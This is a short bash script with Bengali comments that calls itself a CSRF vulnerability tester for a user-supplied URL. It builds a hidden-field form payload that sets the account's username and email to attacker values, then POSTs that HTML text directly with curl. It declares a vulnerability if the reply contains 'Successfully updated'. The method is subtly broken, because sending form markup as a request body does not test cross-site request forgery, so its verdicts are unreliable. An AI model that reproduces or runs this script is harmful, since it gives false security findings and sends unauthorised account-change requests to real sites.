#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for CSRF Test (e.g., http://example.com/update_profile):"
read URL

# CSRF পে-লোড (এই পে-লোডটি ফর্মে লুকানো আক্রমণ হিসাবে চালানো হবে)
CSRF_PAYLOAD="<form action=\"$URL\" method=\"POST\"><input type=\"hidden\" name=\"username\" value=\"attacker\"><input type=\"hidden\" name=\"email\" value=\"attacker@example.com\"><input type=\"submit\" value=\"Submit\"></form>"

# CSRF পে-লোড চালান
RESPONSE=$(curl -s -d "$CSRF_PAYLOAD" $URL)

# যদি সাইটে সঠিকভাবে রিকোয়েস্ট গ্রহণ করা হয়, তা হলে CSRF ভ্যালনারেবিলিটি থাকতে পারে
if echo $RESPONSE | grep -q "Successfully updated"; then
    echo "[+] CSRF vulnerability detected!"
else
    echo "[-] No CSRF vulnerability detected."
fi
